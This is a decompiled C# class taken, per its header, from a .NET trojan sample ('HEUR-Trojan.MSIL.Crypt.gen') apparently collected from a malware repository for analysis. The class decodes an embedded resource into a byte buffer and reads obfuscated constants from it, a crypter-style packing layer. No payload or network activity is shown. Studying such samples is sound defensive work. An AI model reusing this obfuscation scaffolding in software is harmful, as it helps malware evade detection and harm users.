// Decompiled with JetBrains decompiler
// Type: net.QueueScope
// Assembly: net, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F6242565-25BF-4452-B4C5-DC4E00930466
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-fa3e94ff161a26fcc5fbf8a3b4d5e9308b5f25fc6dded888e461db01dd31a273.exe

using System;
using System.Reflection;
using System.Text;

namespace net
{
  internal class QueueScope
  {
    internal static readonly byte[] valuesHandle;
    internal readonly int nextMessage;

    static QueueScope()
    {
      if (QueueScope.valuesHandle != null)
        return;
      byte[] bytes = Convert.FromBase64String("bmV0JQ==");
      string name = Encoding.UTF8.GetString(bytes, 0, bytes.Length);
      QueueScope.valuesHandle = StubAttribute.LoadXmlFile(97L, Assembly.GetExecutingAssembly().GetManifestResourceStream(name));
    }

    internal static int CopyProcess(int valuesHandle) => BitConverter.ToInt32(QueueScope.valuesHandle, valuesHandle);

    internal static long FindGroup(int valuesHandle) => BitConverter.ToInt64(QueueScope.valuesHandle, valuesHandle);

    internal static float OpenCondition(int valuesHandle) => BitConverter.ToSingle(QueueScope.valuesHandle, valuesHandle);

    internal static double SortCondition(int valuesHandle) => BitConverter.ToDouble(QueueScope.valuesHandle, valuesHandle);

    internal static void ClearComponent(Array valuesHandle, int nextMessage)
    {
      int count;
      if (((int) QueueScope.valuesHandle[nextMessage] & 128) == 0)
      {
        count = (int) QueueScope.valuesHandle[nextMessage];
        ++nextMessage;
      }
      else if (((int) QueueScope.valuesHandle[nextMessage] & 64) == 0)
      {
        count = ((int) QueueScope.valuesHandle[nextMessage] & -129) << 8 | (int) QueueScope.valuesHandle[nextMessage + 1];
        nextMessage += 2;
      }
      else
      {
        count = ((int) QueueScope.valuesHandle[nextMessage] & -193) << 24 | (int) QueueScope.valuesHandle[nextMessage + 1] << 16 | (int) QueueScope.valuesHandle[nextMessage + 2] << 8 | (int) QueueScope.valuesHandle[nextMessage + 3];
        nextMessage += 4;
      }
      if (count < 1)
        return;
      Buffer.BlockCopy((Array) QueueScope.valuesHandle, nextMessage, valuesHandle, 0, count);
    }
  }
}
